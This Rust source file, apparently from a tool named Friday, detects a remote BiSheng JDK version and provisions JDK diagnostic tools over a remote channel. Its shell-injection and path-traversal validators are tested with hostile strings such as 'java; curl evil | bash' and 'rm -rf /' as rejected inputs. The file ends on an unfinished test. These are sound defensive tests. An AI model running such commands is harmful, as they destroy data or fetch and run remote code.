use crate::provision::package::{
    emit_progress, ProvisionContext, ProvisionError, ProvisionResult, ToolPackage,
};
use async_trait::async_trait;
use serde::Serialize;
use std::time::Duration;

/// BiSheng 版本解析结果
#[derive(Clone, Debug, PartialEq, Serialize)]
pub struct BishengVersion {
    pub product_dir: String,
    pub major_dir: String,
    pub full_dir: String,
}

/// java -version + uname -m 的探测结果
#[derive(Clone, Debug, PartialEq, Serialize)]
pub struct JvmProbe {
    pub openjdk_version: String,
    pub bisheng_version: String,
    pub arch: String,
}

/// 从 java -version 与 uname -m 的输出解析探测信息。
/// BiSheng 串可能出现在 stdout 或 stderr，两路都扫。
pub fn parse_probe_output(stdout: &str, stderr: &str) -> Result<JvmProbe, String> {
    if stdout.contains("command not found") || stderr.contains("command not found") {
        return Err(format!(
            "probe_failed: java not found on target. stdout: {stdout:?} stderr: {stderr:?}. \
             请先通过 run_command 确认目标服务的 java 可执行文件路径，再用 java_bin 参数指定"
        ));
    }

    let combined = format!("{stdout}\n{stderr}");
    let openjdk_version = combined
        .lines()
        .find_map(|l| {
            let l = l.trim();
            l.starts_with("openjdk version")
                .then(|| l.split('"').nth(1).unwrap_or_default().to_string())
        })
        .ok_or_else(|| {
            format!(
                "parse_failed: no `openjdk version` line found. stdout: {stdout:?} stderr: {stderr:?}"
            )
        })?;
    if openjdk_version.is_empty() {
        return Err(format!(
            "parse_failed: empty openjdk version. stdout: {stdout:?} stderr: {stderr:?}"
        ));
    }
    // 版本串会被拼进远端 shell 命令与路径，只允许 [A-Za-z0-9 . + _ -]，
    // 拒绝 `/`、空格、引号、`$;|&` 等注入/穿越载体
    if !openjdk_version
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '_' | '-'))
    {
        return Err(format!(
            "parse_failed: suspicious openjdk version {openjdk_version:?} \
             (allowed charset: [A-Za-z0-9 . + _ -]). stdout: {stdout:?} stderr: {stderr:?}"
        ));
    }

    let bisheng_version = match extract_bisheng_version(&combined) {
        Ok(Some(v)) => v,
        Ok(None) => {
            return Err(format!(
                "unsupported_vendor: no BiSheng version string found (only BiSheng is supported in this version). stdout: {stdout:?} stderr: {stderr:?}"
            ))
        }
        Err(e) => return Err(e),
    };

    let arch_raw = stdout
        .split("---")
        .nth(1)
        .and_then(|tail| {
            tail.lines()
                .map(str::trim)
                .filter(|l| !l.is_empty())
                .last()
        })
        .ok_or_else(|| {
            format!("parse_failed: no uname -m output after --- separator. stdout: {stdout:?}")
        })?;
    let arch = normalize_arch(arch_raw)?;

    Ok(JvmProbe {
        openjdk_version,
        bisheng_version,
        arch,
    })
}

/// BiSheng 版本串 → 三段目录名
pub fn parse_bisheng_version(s: &str) -> Result<BishengVersion, String> {
    let s = s.trim();
    let re = regex::Regex::new(
        r"^(?P<product>BiSheng(?:_[A-Za-z0-9]+)*?)_(?P<version>\d+\.\d+(?:\.\d+)*(?:\.?[AB]\d+)?)$",
    )
    .map_err(|e| format!("parse_failed: regex build error: {e}"))?;
    let caps = re
        .captures(s)
        .ok_or_else(|| format!("parse_failed: not a BiSheng version string: {s:?}"))?;

    let product_raw = caps.name("product").unwrap().as_str();
    let version = caps.name("version").unwrap().as_str();
    let product = product_raw.replace('_', " ");

    let major = version.split('.').next().unwrap_or_default();
    if major.is_empty() {
        return Err(format!("parse_failed: no major version in {s:?}"));
    }

    Ok(BishengVersion {
        product_dir: product.clone(),
        major_dir: format!("{product} {major}"),
        // Artifactory 三段目录全部用空格形式（issue #4 第二轮反馈）：
        // 第三段 = product + " " + 完整版本号，而非原串原样保留
        full_dir: format!("{product} {version}"),
    })
}

/// 从 java -version 的合并输出中提取 BiSheng 版本串。
/// 两种布局都支持（issue #4 真实环境为第二种）：
/// 1. 独立成行：`BiSheng_JDK_Enterprise_205.2.0.110.B001`
/// 2. 行中间：`OpenJDK Runtime Environment BiSheng_JDK_Enterprise_205.2.0.110.B001 (build ...)`
/// 完全没有 BiSheng 字样时返回 None（unsupported_vendor）；
/// 有 BiSheng 字样但无任何可识别版本串时返回 None 但调用方错误消息需要区分——
/// 因此本函数返回 Result<Option<String>, String>：Err = 有 BiSheng 字样但格式不认识。
fn extract_bisheng_version(combined: &str) -> Result<Option<String>, String> {
    let mut saw_bisheng_word = false;
    for line in combined.lines() {
        if !line.contains("BiSheng") {
            continue;
        }
        saw_bisheng_word = true;
        // 行内所有 BiSheng 开头的候选 token
        let re = regex::Regex::new(r"BiSheng[A-Za-z0-9_.]*").unwrap();
        for m in re.find_iter(line) {
            if parse_bisheng_version(m.as_str()).is_ok() {
                return Ok(Some(m.as_str().to_string()));
            }
        }
    }
    if saw_bisheng_word {
        // 有 BiSheng 字样但格式全部不认识——这不是"非 BiSheng 环境"，
        // 不能误报 unsupported_vendor（issue #4 的错误消息 bug）
        let sample = combined
            .lines()
            .find(|l| l.contains("BiSheng"))
            .unwrap_or_default()
            .trim();
        return Err(format!(
            "parse_failed: found BiSheng line but no recognizable version string: {sample:?}. \
             请把完整 java -version 输出报给 Friday 维护者以扩展解析规则"
        ));
    }
    Ok(None)
}

/// 拼下载 URL。目录段 URL encode（空格 → %20，_ 等非保留字符不动），文件名不 encode。
pub fn build_download_url(base: &str, probe: &JvmProbe) -> Result<String, String> {
    let v = parse_bisheng_version(&probe.bisheng_version)?;
    let base = base.trim_end_matches('/');
    Ok(format!(
        "{base}/{}/{}/{}/jdk-{}-linux-{}.tar.gz",
        url_encode_path_segment(&v.product_dir),
        url_encode_path_segment(&v.major_dir),
        url_encode_path_segment(&v.full_dir),
        probe.openjdk_version,
        probe.arch,
    ))
}

/// uname -m 输出 → 产物 arch 名
pub fn normalize_arch(uname_m: &str) -> Result<String, String> {
    match uname_m.trim() {
        "x86_64" | "amd64" => Ok("x64".to_string()),
        "aarch64" | "arm64" => Ok("aarch64".to_string()),
        other => Err(format!(
            "parse_failed: unsupported arch: {other:?} (supported: x86_64, aarch64)"
        )),
    }
}

/// URL path segment 编码：RFC 3986 非保留字符之外全部 percent-encode
fn url_encode_path_segment(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'.' | b'_' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

pub const REMOTE_TOOLS_DIR: &str = "/tmp/friday-tools";
pub const JDK_BINS: [&str; 4] = ["jcmd", "jstat", "jstack", "jmap"];

/// 进度事件携带的工具名：必须与 MCP 工具名一致（前端按 tool.name 匹配工具卡片）
pub const JDK_TOOL_NAME: &str = "ensure_tool";

/// java_bin 字符集白名单校验（防 shell 注入）：
/// 非空，且所有字符都在 [A-Za-z0-9 / . _ - + ~] 内
pub fn validate_java_bin(java_bin: &str) -> Result<(), String> {
    if java_bin.is_empty() {
        return Err("invalid_params: java_bin must not be empty".to_string());
    }
    if !java_bin.chars().all(|c| {
        c.is_ascii_alphanumeric() || matches!(c, ' ' | '/' | '.' | '_' | '-' | '+' | '~')
    }) {
        return Err(format!(
            "invalid_params: java_bin contains disallowed characters (allowed: [A-Za-z0-9 / . _ - + ~]): {java_bin:?}"
        ));
    }
    Ok(())
}

/// 按探测到的 OpenJDK 版本命名的安装目录
pub fn jdk_home_for(openjdk_version: &str) -> String {
    format!("{REMOTE_TOOLS_DIR}/jdk-{openjdk_version}")
}

pub struct JdkPackage;

#[async_trait]
impl ToolPackage for JdkPackage {
    fn name(&self) -> &str {
        "jdk"
    }

    async fn probe(&self, ctx: &ProvisionContext, java_bin: &str) -> Result<JvmProbe, ProvisionError> {
        validate_java_bin(java_bin).map_err(|e| ProvisionError::new("invalid_params", "probe", e))?;
        emit_progress(ctx, JDK_TOOL_NAME, "probe", &format!("running `{java_bin} -version`"));
        let cmd = format!("{java_bin} -version 2>&1 ; echo '---' ; uname -m");
        let out = run_remote(ctx, &cmd, Duration::from_secs(ctx.timeouts.probe), "probe").await?;
        let probe = parse_probe_output(&out.stdout, &out.stderr).map_err(|e| {
            let code = e.split(':').next().unwrap_or("parse_failed").to_string();
            ProvisionError::new(&code, "probe", e)
        })?;
        Ok(probe)
    }

    async fn ensure(&self, ctx: &ProvisionContext, java_bin: &str) -> Result<ProvisionResult, ProvisionError> {
        let start = std::time::Instant::now();
        let probe = self.probe(ctx, java_bin).await?;
        let home = jdk_home_for(&probe.openjdk_version);
        let tarball = format!("{REMOTE_TOOLS_DIR}/jdk-{}.tar.gz", probe.openjdk_version);

        // 1. 远端缓存检查
        emit_progress(ctx, JDK_TOOL_NAME, "check_cache", &format!("checking {home}/bin/jcmd"));
        let check = run_remote(ctx, &format!("mkdir -p {REMOTE_TOOLS_DIR} && test -x {home}/bin/jcmd"), Duration::from_secs(ctx.timeouts.probe), "check_cache").await?;
        if check.exit_code == 0 {
            return Ok(ProvisionResult {
                cached: true,
                bins: bins_for(&home),
                tool_home: home,
                elapsed_ms: start.elapsed().as_millis() as u64,
                java_version: probe.openjdk_version.clone(),
                bisheng_version: probe.bisheng_version.clone(),
                arch: probe.arch.clone(),
                tool: "jdk".to_string(),
            });
        }

        // 2. 解析 URL
        let url = build_download_url(&ctx.artifactory_base_url, &probe)
            .map_err(|e| ProvisionError::new("parse_failed", "resolve_url", e))?;

        // 3. 通道 A：目标自拉
        emit_progress(ctx, JDK_TOOL_NAME, "download", "channel A: remote curl/wget");
        let dl_result = try_remote_download(ctx, &url, &tarball).await;
        if let Err(a_err) = dl_result {
            tracing::warn!(session_id = %ctx.session_id, env_id = %ctx.env_id, error = %a_err, "channel A failed, falling back to channel B");
            emit_progress(ctx, JDK_TOOL_NAME, "download", "channel B: local download + sftp upload");
            // 通道 B：本地下载 + 上传
            let local = crate::provision::transfer::download_to_cache(&url, &ctx.cache_dir)
                .map_err(|e| ProvisionError {
                    url: Some(url.clone()),
                    ..ProvisionError::new("provision_failed", "download_local", e)
                })?;
            if let Err(e) = crate::provision::transfer::validate_download(&local, 50 * 1024 * 1024) {
                // 缓存的 tarball 损坏（如过小/被污染）：删除以便重试时重新下载
                tracing::warn!(session_id = %ctx.session_id, env_id = %ctx.env_id, path = %local.display(), error = %e, "local cached tarball failed validation, removing");
                let _ = std::fs::remove_file(&local);
                return Err(ProvisionError {
                    url: Some(url.clone()),
                    ..ProvisionError::new("provision_failed", "download_local", e)
                });
            }
            ctx.channel.upload(&local, &tarball).await.map_err(|e| {
                let ch = ctx.channel.clone();
                let cleanup = tarball.clone();
                tokio::spawn(async move {
                    let _ = ch.run(&format!("rm -f {cleanup}")).await;
                });
                ProvisionError {
                    url: Some(url.clone()),
                    ..ProvisionError::new("provision_failed", "upload", e.to_string())
                }
            })?;
        }

        // 4. 解压 + 目录规范化 + 清理 tar 包
        emit_progress(ctx, JDK_TOOL_NAME, "extract", &format!("extracting {tarball}"));
        let v = probe.openjdk_version.as_str();
        let extract_cmd = format!(
            "mkdir -p {REMOTE_TOOLS_DIR} && cd {REMOTE_TOOLS_DIR} && \
             tar -xzf jdk-{v}.tar.gz && \
             topdir=$(tar -tzf jdk-{v}.tar.gz | head -1 | cut -f1 -d'/') && \
             if [ \"$topdir\" != \"jdk-{v}\" ] && [ -d \"$topdir\" ]; then rm -rf jdk-{v} && mv \"$topdir\" jdk-{v}; fi && \
             rm -f jdk-{v}.tar.gz"
        );
        let extract = run_remote(ctx, &extract_cmd, Duration::from_secs(ctx.timeouts.extract), "extract").await?;
        if extract.exit_code != 0 {
            let ch = ctx.channel.clone();
            let cleanup_home = home.clone();
            tokio::spawn(async move {
                let _ = ch.run(&format!("rm -rf {cleanup_home}")).await;
            });
            return Err(ProvisionError {
                url: Some(url.clone()),
                ..ProvisionError::new(
                    "provision_failed",
                    "extract",
                    format!("tar failed (exit {}): {}", extract.exit_code, extract.stderr),
                )
            });
        }

        // 5. 验证
        emit_progress(ctx, JDK_TOOL_NAME, "verify", &format!("verifying {home}/bin/jcmd"));
        let verify = run_remote(
            ctx,
            &format!("test -x {home}/bin/jcmd && test -x {home}/bin/jstat"),
            Duration::from_secs(ctx.timeouts.verify),
            "verify",
        )
        .await?;
        if verify.exit_code != 0 {
            return Err(ProvisionError {
                url: Some(url.clone()),
                ..ProvisionError::new(
                    "provision_failed",
                    "verify",
                    format!("jdk binaries missing after extract; check artifactory base url setting ({})", ctx.artifactory_base_url),
                )
            });
        }

        Ok(ProvisionResult {
            cached: false,
            bins: bins_for(&home),
            tool_home: home,
            elapsed_ms: start.elapsed().as_millis() as u64,
            java_version: probe.openjdk_version,
            bisheng_version: probe.bisheng_version,
            arch: probe.arch,
            tool: "jdk".to_string(),
        })
    }
}

/// 通道 A：目标环境自拉。返回 Ok(()) 或错误描述。
async fn try_remote_download(ctx: &ProvisionContext, url: &str, tarball: &str) -> Result<(), String> {
    let which = ctx
        .channel
        .run("command -v curl || command -v wget")
        .await
        .map_err(|e| format!("probe downloader failed: {e}"))?;
    if which.exit_code != 0 {
        return Err("no curl/wget on target".to_string());
    }
    let has_curl = which.stdout.trim().contains("curl");
    let cmd = if has_curl {
        format!(
            "curl -fL --connect-timeout 15 --max-time {t} -o {tarball} {url}",
            t = ctx.timeouts.download,
        )
    } else {
        format!("wget -T 15 -t 2 -O {tarball} {url}")
    };
    let out = ctx
        .channel
        .run(&cmd)
        .await
        .map_err(|e| format!("remote download exec failed: {e}"))?;
    if out.exit_code != 0 {
        return Err(format!("remote download exit {}: {}", out.exit_code, out.stderr));
    }
    Ok(())
}

/// 带超时执行远端命令；超时/失败映射 ProvisionError。
async fn run_remote(
    ctx: &ProvisionContext,
    cmd: &str,
    timeout: Duration,
    stage: &str,
) -> Result<crate::exec::channel::ExecOutput, ProvisionError> {
    match tokio::time::timeout(timeout, ctx.channel.run(cmd)).await {
        Ok(Ok(out)) => Ok(out),
        Ok(Err(e)) => Err(ProvisionError::new("provision_failed", stage, format!("remote exec failed: {e}"))),
        Err(_) => Err(ProvisionError::new("provision_failed", stage, format!("remote command timed out after {}s", timeout.as_secs()))),
    }
}

fn bins_for(home: &str) -> std::collections::HashMap<String, String> {
    JDK_BINS
        .iter()
        .map(|b| (b.to_string(), format!("{home}/bin/{b}")))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    const PROBE_STDOUT: &str = "BiSheng_JDK_Enterprise_205.2.0.110.B001\n---\nx86_64\n";
    const PROBE_STDERR: &str = "openjdk version \"21.0.11\" 2025-04-15\nOpenJDK Runtime Environment (build 21.0.11+9-LTS)\nOpenJDK 64-Bit Server VM (build 21.0.11+9-LTS, mixed mode)\n";

    /// issue #4 的真实输出：BiSheng 串出现在行中间（Runtime Environment / Server VM 行内），
    /// 而非独立行。旧解析器要求 BiSheng 行首匹配 → 误报 unsupported_vendor。
    const ISSUE4_STDERR: &str = "openjdk version \"21.0.11\" 2026-04-21\nOpenJDK Runtime Environment BiSheng_JDK_Enterprise_205.2.0.110.B001 (build 21.0.11+10)\nOpenJDK 64-Bit Server VM BiSheng_JDK_Enterprise_205.2.0.110.B001 (build 21.0.11+10, mixed mode, sharing)\n";

    #[test]
    fn test_parse_probe_output_issue4_bisheng_inline() {
        // java -version 走 2>&1 合并进 stdout 的真实场景
        let stdout = &format!("{ISSUE4_STDERR}---\nx86_64\n");
        let probe = parse_probe_output(stdout, "").unwrap();
        assert_eq!(probe.openjdk_version, "21.0.11");
        assert_eq!(probe.bisheng_version, "BiSheng_JDK_Enterprise_205.2.0.110.B001");
        assert_eq!(probe.arch, "x64");
    }

    #[test]
    fn test_parse_probe_output_issue4_bisheng_inline_on_stderr() {
        // 分立输出场景：BiSheng 串在 stderr 的行中间
        let stdout = "---\nx86_64\n";
        let probe = parse_probe_output(stdout, ISSUE4_STDERR).unwrap();
        assert_eq!(probe.bisheng_version, "BiSheng_JDK_Enterprise_205.2.0.110.B001");
        assert_eq!(probe.openjdk_version, "21.0.11");
    }

    #[test]
    fn test_parse_probe_output_unrecognized_bisheng_line_reports_parse_failed_not_vendor() {
        // 输出里有 BiSheng 字样但格式不认识 → 报 parse_failed（带原始行），
        // 而非误导性的 unsupported_vendor（issue #4 的错误消息问题）
        let stdout = "---\nx86_64\n";
        let stderr = "openjdk version \"21.0.11\" 2025-04-15\nBiSheng_Some_Unknown_Format\n";
        let err = parse_probe_output(stdout, stderr).unwrap_err();
        assert!(err.contains("parse_failed"), "unrecognized BiSheng line must be parse_failed, err: {err}");
        assert!(err.contains("BiSheng_Some_Unknown_Format"), "err should carry the raw line, err: {err}");
    }

    #[test]
    fn test_parse_probe_output_standard() {
        let probe = parse_probe_output(PROBE_STDOUT, PROBE_STDERR).unwrap();
        assert_eq!(probe.openjdk_version, "21.0.11");
        assert_eq!(probe.bisheng_version, "BiSheng_JDK_Enterprise_205.2.0.110.B001");
        assert_eq!(probe.arch, "x64");
    }

    #[test]
    fn test_parse_probe_output_bisheng_on_stderr() {
        let stdout = "---\nx86_64\n";
        let stderr = &format!("BiSheng_JDK_Enterprise_205.2.0.110.B001\nopenjdk version \"21.0.11\" 2025-04-15\n");
        let probe = parse_probe_output(stdout, stderr).unwrap();
        assert_eq!(probe.bisheng_version, "BiSheng_JDK_Enterprise_205.2.0.110.B001");
        assert_eq!(probe.openjdk_version, "21.0.11");
    }

    #[test]
    fn test_parse_probe_output_no_bisheng_is_unsupported_vendor() {
        let stdout = "---\nx86_64\n";
        let stderr = "openjdk version \"21.0.11\" 2025-04-15\n";
        let err = parse_probe_output(stdout, stderr).unwrap_err();
        assert!(err.contains("unsupported_vendor"), "err: {err}");
        assert!(err.contains("21.0.11"), "err should carry original output: {err}");
    }

    #[test]
    fn test_parse_probe_output_no_openjdk_version() {
        let stdout = "BiSheng_JDK_Enterprise_205.2.0.110.B001\n---\nx86_64\n";
        let err = parse_probe_output(stdout, "OpenJDK Runtime Environment (build 21.0.11+9-LTS)\n").unwrap_err();
        assert!(err.contains("parse_failed"), "err: {err}");
    }

    #[test]
    fn test_parse_probe_output_java_not_found() {
        let err = parse_probe_output("---\n", "bash: java: command not found\n").unwrap_err();
        assert!(err.contains("probe_failed"), "err: {err}");
    }

    #[test]
    fn test_parse_probe_output_unknown_arch() {
        let stdout = "BiSheng_JDK_Enterprise_205.2.0.110.B001\n---\nriscv64\n";
        let err = parse_probe_output(stdout, PROBE_STDERR).unwrap_err();
        assert!(err.contains("parse_failed") || err.contains("arch"), "err: {err}");
    }

    #[test]
    fn test_parse_probe_output_rejects_hostile_version_injection() {
        let stdout = "BiSheng_JDK_Enterprise_205.2.0.110.B001\n---\nx86_64\n";
        let stderr = "openjdk version \"21.0.11; rm -rf ~ #\" 2025-04-15\n";
        let err = parse_probe_output(stdout, stderr).unwrap_err();
        assert!(err.contains("parse_failed"), "hostile version must be rejected, err: {err}");
    }

    #[test]
    fn test_parse_probe_output_rejects_version_path_traversal() {
        let stdout = "BiSheng_JDK_Enterprise_205.2.0.110.B001\n---\nx86_64\n";
        let stderr = "openjdk version \"21.0.11/../../bin/sh\" 2025-04-15\n";
        let err = parse_probe_output(stdout, stderr).unwrap_err();
        assert!(err.contains("parse_failed"), "version with / must be rejected, err: {err}");
    }

    #[test]
    fn test_parse_probe_output_accepts_build_suffix_version() {
        let stdout = "BiSheng_JDK_Enterprise_205.2.0.110.B001\n---\nx86_64\n";
        let stderr = "openjdk version \"21.0.11+9-LTS\" 2025-04-15\n";
        let probe = parse_probe_output(stdout, stderr).unwrap();
        assert_eq!(probe.openjdk_version, "21.0.11+9-LTS");
    }

    #[test]
    fn test_parse_bisheng_version_standard() {
        let v = parse_bisheng_version("BiSheng_JDK_Enterprise_205.2.0.110.B001").unwrap();
        assert_eq!(v.product_dir, "BiSheng JDK Enterprise");
        assert_eq!(v.major_dir, "BiSheng JDK Enterprise 205");
        // full_dir 也是空格形式：Artifactory 三段目录全部用空格（issue #4 第二轮反馈）
        assert_eq!(v.full_dir, "BiSheng JDK Enterprise 205.2.0.110.B001");
    }

    #[test]
    fn test_parse_bisheng_version_malformed() {
        assert!(parse_bisheng_version("OpenJDK").is_err());
        assert!(parse_bisheng_version("BiSheng_JDK_Enterprise_").is_err());
        assert!(parse_bisheng_version("BiSheng_JDK_Enterprise_ABC").is_err());
        assert!(parse_bisheng_version("").is_err());
    }

    #[test]
    fn test_parse_bisheng_version_two_segment_product() {
        let v = parse_bisheng_version("BiSheng_JDK_Compact_105.1.0.B002").unwrap();
        assert_eq!(v.product_dir, "BiSheng JDK Compact");
        assert_eq!(v.major_dir, "BiSheng JDK Compact 105");
        assert_eq!(v.full_dir, "BiSheng JDK Compact 105.1.0.B002");
    }

    /// issue #4 第二轮反馈：三段目录全部用空格形式（_→空格），
    /// 第三段是 product + 完整版本号，不是原串原样保留
    #[test]
    fn test_build_download_url_real_artifactory_layout() {
        let probe = parse_probe_output(PROBE_STDOUT, PROBE_STDERR).unwrap();
        let url = build_download_url(
            "https://cmc-szver-artifactory.cmc.tools.huawei.com/artifactory/cmc-software-release",
            &probe,
        )
        .unwrap();
        assert_eq!(
            url,
            "https://cmc-szver-artifactory.cmc.tools.huawei.com/artifactory/cmc-software-release/BiSheng%20JDK%20Enterprise/BiSheng%20JDK%20Enterprise%20205/BiSheng%20JDK%20Enterprise%20205.2.0.110.B001/jdk-21.0.11-linux-x64.tar.gz"
        );
    }

    #[test]
    fn test_build_download_url_full() {
        let probe = parse_probe_output(PROBE_STDOUT, PROBE_STDERR).unwrap();
        let url = build_download_url("https://artifactory.example.com/artifactory/release", &probe).unwrap();
        assert_eq!(
            url,
            "https://artifactory.example.com/artifactory/release/BiSheng%20JDK%20Enterprise/BiSheng%20JDK%20Enterprise%20205/BiSheng%20JDK%20Enterprise%20205.2.0.110.B001/jdk-21.0.11-linux-x64.tar.gz"
        );
    }

    #[test]
    fn test_build_download_url_base_trailing_slash_normalized() {
        let probe = parse_probe_output(PROBE_STDOUT, PROBE_STDERR).unwrap();
        let url = build_download_url("https://artifactory.example.com/artifactory/release/", &probe).unwrap();
        assert!(url.contains("release/BiSheng%20JDK%20Enterprise/"), "url: {url}");
        assert!(!url.contains("release//"), "url: {url}");
    }

    #[test]
    fn test_normalize_arch() {
        assert_eq!(normalize_arch("x86_64\n").unwrap(), "x64");
        assert_eq!(normalize_arch("aarch64\n").unwrap(), "aarch64");
        assert!(normalize_arch("riscv64").is_err());
    }

    #[test]
    fn test_validate_java_bin_accepts_plain_and_paths() {
        assert!(validate_java_bin("java").is_ok());
        assert!(validate_java_bin("/usr/lib/jvm/bisheng-jdk/bin/java").is_ok());
        assert!(validate_java_bin("./java21.bin").is_ok());
        assert!(validate_java_bin("/opt/jdk-21.0.11+9/bin/java").is_ok());
    }

    #[test]
    fn test_validate_java_bin_rejects_injection_and_empty() {
        assert!(validate_java_bin("java; curl evil | bash").is_err());
        assert!(validate_java_bin("java `x`").is_err());
        assert!(validate_java_bin("java $(x)").is_err());
        assert!(validate_java_bin("java \" $(id)\"").is_err());
        assert!(validate_java_bin("java && rm -rf /").is_err());
        assert!(validate_java_bin("").is_err());
    }

    use crate::exec::channel::{ExecChannel, ExecOutput};
    use crate::provision::package::{ProvisionContext, StageTimeouts};
    use std::sync::Arc;
    use tokio::sync::Mutex as TokioMutex;

    /// 顺序消费 Mock：第 n 次 run 返回第 n 条预置输出
    struct SequentialChannel {
        responses: TokioMutex<std::collections::VecDeque<ExecOutput>>,
        calls: TokioMutex<Vec<String>>,
    }

    impl SequentialChannel {
        fn new(responses: Vec<(&str, i32)>) -> Self {
            Self {
                responses: TokioMutex::new(
                    responses
                        .into_iter()
                        .map(|(out, code)| ExecOutput {
                            stdout: out.to_string(),
                            stderr: String::new(),
                            exit_code: code,
                        })
                        .collect(),
                ),
                calls: TokioMutex::new(Vec::new()),
            }
        }
    }

    #[async_trait::async_trait]
    impl ExecChannel for SequentialChannel {
        async fn run(&self, cmd: &str) -> Result<ExecOutput, Box<dyn std::error::Error + Send + Sync>> {
            self.calls.lock().await.push(cmd.to_string());
            Ok(self.responses.lock().await.pop_front().unwrap_or(ExecOutput {
                stdout: String::new(),
                stderr: String::new(),
                exit_code: 1,
            }))
        }
        async fn connect(&self) -> Result<(), Box<dyn std::error::Error + Send + Sync>> { Ok(()) }
        async fn disconnect(&self) {}
        async fn is_alive(&self) -> bool { true }
        async fn upload(&self, _local: &std::path::Path, _remote: &str)
            -> Result<(), Box<dyn std::error::Error + Send + Sync>> { Ok(()) }
    }

    fn test_ctx(channel: Arc<SequentialChannel>) -> ProvisionContext {
        ProvisionContext {
            session_id: "s1".into(),
            env_id: "env-1".into(),
            channel,
            cache_dir: std::path::PathBuf::from("/tmp/unused-cache"),
            artifactory_base_url: "https://artifactory.example.com/artifactory/release".into(),
            timeouts: StageTimeouts::default(),
            bus: crate::app::events::EventBus::disabled(),
        }
    }

    #[tokio::test]
    async fn test_ensure_cache_hit_returns_without_download() {
        let channel = Arc::new(SequentialChannel::new(vec![
            ("BiSheng_JDK_Enterprise_205.2.0.110.B001\nopenjdk version \"21.0.11\" 2025-04-15\n---\nx86_64\n", 0),
            ("", 0), // test -x 缓存命中
        ]));
        let ctx = test_ctx(channel.clone());
        let result = JdkPackage.ensure(&ctx, "java").await.unwrap();
        assert!(result.cached);
        assert_eq!(result.tool_home, "/tmp/friday-tools/jdk-21.0.11");
        assert_eq!(result.bins["jcmd"], "/tmp/friday-tools/jdk-21.0.11/bin/jcmd");
        assert_eq!(result.arch, "x64");
        let calls = channel.calls.lock().await;
        assert!(calls.iter().all(|c| !c.contains("curl") && !c.contains("wget")), "calls: {calls:?}");
        // C1: 下载通道写文件之前远端目录必须已存在（缓存检查命令顺带 mkdir）
        assert!(calls.iter().any(|c| c.contains("mkdir -p /tmp/friday-tools")), "calls: {calls:?}");
    }

    #[tokio::test]
    async fn test_ensure_channel_a_download_and_extract() {
        let channel = Arc::new(SequentialChannel::new(vec![
            ("BiSheng_JDK_Enterprise_205.2.0.110.B001\nopenjdk version \"21.0.11\" 2025-04-15\n---\nx86_64\n", 0),
            ("", 1),                // 缓存未命中
            ("/usr/bin/curl\n", 0), // command -v curl
            ("", 0),                // curl 下载成功
            ("", 0),                // tar 解压成功
            ("", 0),                // 验证成功
        ]));
        let ctx = test_ctx(channel.clone());
        let result = JdkPackage.ensure(&ctx, "java").await.unwrap();
        assert!(!result.cached);
        assert_eq!(result.tool_home, "/tmp/friday-tools/jdk-21.0.11");
        let calls = channel.calls.lock().await;
        assert!(calls.iter().any(|c| c.contains("BiSheng%20JDK%20Enterprise")), "calls: {calls:?}");
        assert!(calls.iter().any(|c| c.contains("tar -xzf")), "calls: {calls:?}");
        // I6: mv 分支必须先清掉可能残留的 jdk-{v} 目录，防止重试时 mv 嵌套进旧目录
        assert!(calls.iter().any(|c| c.contains("rm -rf jdk-21.0.11")), "calls: {calls:?}");
    }

    #[tokio::test]
    async fn test_ensure_channel_a_failure_falls_back_to_channel_b() {
        let channel = Arc::new(SequentialChannel::new(vec![
            ("BiSheng_JDK_Enterprise_205.2.0.110.B001\nopenjdk version \"21.0.11\" 2025-04-15\n---\nx86_64\n", 0),
            ("", 1),
            ("/usr/bin/curl\n", 0),
            ("", 1), // curl 下载失败
        ]));
        let tmp = tempfile::tempdir().unwrap();
        let cache = tmp.path().join("cache");
        std::fs::create_dir_all(&cache).unwrap();
        let mut ctx = test_ctx(channel);
        ctx.cache_dir = cache;
        // 本地下载 URL 不可达（artifactory.example.com）→ provision_failed/download_local
        let err = JdkPackage.ensure(&ctx, "java").await.unwrap_err();
        assert_eq!(err.code, "provision_failed");
        assert_eq!(err.stage, "download_local");
    }

    #[tokio::test]
    async fn test_ensure_verify_failure_reports_verify_stage() {
        let channel = Arc::new(SequentialChannel::new(vec![
            ("BiSheng_JDK_Enterprise_205.2.0.110.B001\nopenjdk version \"21.0.11\" 2025-04-15\n---\nx86_64\n", 0),
            ("", 1),
            ("/usr/bin/curl\n", 0),
            ("", 0),
            ("", 0),
            ("", 1), // 验证失败
        ]));
        let ctx = test_ctx(channel);
        let err = JdkPackage.ensure(&ctx, "java").await.unwrap_err();
        assert_eq!(err.code, "provision_failed");
        assert_eq!(err.stage, "verify");
    }

    #[tokio::test]
    async fn test_ensure_channel_a_no_curl_wget_reports_download_a() {
        let channel = Arc::new(SequentialChannel::new(vec![
            ("BiSheng_JDK_Enterprise_205.2.0.110.B001\nopenjdk version \"21.0.11\" 2025-04-15\n---\nx86_64\n", 0),
            ("", 1),
            ("", 1), // 无 curl/wget
        ]));
        let tmp = tempfile::tempdir().unwrap();
        let cache = tmp.path().join("cache");
        std::fs::create_dir_all(&cache).unwrap();
        let mut ctx = test_ctx(channel);
        ctx.cache_dir = cache;
        let err = JdkPackage.ensure(&ctx, "java").await.unwrap_err();
        assert_eq!(err.code, "provision_failed");
        assert_eq!(err.stage, "download_local");
    }

    #[tokio::test]
    async fn test_jdk_tool_name_matches_mcp_tool_def_name() {
        let def = crate::tools::builtin::ensure_tool::ensure_tool_tool_def(
            sqlx::SqlitePool::connect_lazy("sqlite::memory:").unwrap(),
            Arc::new(TokioMutex::new(crate::exec::pool::ExecChannelPool::new())),
            std::path::PathBuf::from("/tmp/x"),
            crate::app::events::EventBus::disabled(),
        );
        assert_eq!(
            JDK_TOOL_NAME,
            def.name,
            "progress tool name must equal the MCP tool name (frontend matches tool cards by it)"
        );
    }

    #[tokio::test]
    async fn test_probe_rejects_unsafe_java_bin_without_running() {
        let channel = Arc::new(SequentialChannel::new(vec![]));
        let ctx = test_ctx(channel.clone());
        let err = JdkPackage.probe(&ctx, "java; rm -rf /").await.unwrap_err();
        assert_eq!(err.code, "invalid_params");
        assert_eq!(err.stage, "probe");
        let calls = channel.calls.lock().await;
        assert!(calls.is_empty(), "unsafe java_bin must never reach the remote shell, calls: {calls:?}");
    }

    #[tokio::test]
